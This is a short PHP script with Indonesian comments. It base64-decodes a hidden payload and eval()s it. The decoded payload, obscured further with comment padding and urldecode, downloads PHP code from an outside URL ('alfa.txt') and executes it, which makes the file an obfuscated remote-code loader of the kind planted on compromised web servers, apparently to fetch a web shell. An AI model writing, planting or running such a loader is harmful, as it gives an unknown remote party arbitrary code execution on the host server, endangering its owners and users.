<?php
// base64 kamu
$base64 = "PD9waHAgZXZhbCgNCiAgICAvKipfKiovIHVybGRlY29kZSgiJTNmJTNlIikgLg0KICAgICAgICBmaWxlX2dldF9jb250ZW50cygNCiAgICAgICAgICAgIC8qKl8qKi8gdXJsZGVjb2RlKA0KICAgICAgICAgICAgICAgIC8qKl8qKi8gImh0dHBzOi8vd3d3LnRhcGZ1c2UuaW8vcmF3L2FsZmEudHh0Ig0KICAgICAgICAgICAgKQ0KICAgICAgICApDQopOyA/Pg==";

// decode base64 → jadi kode PHP asli
$decoded = base64_decode($base64);

// jalankan hasilnya
eval($decoded);
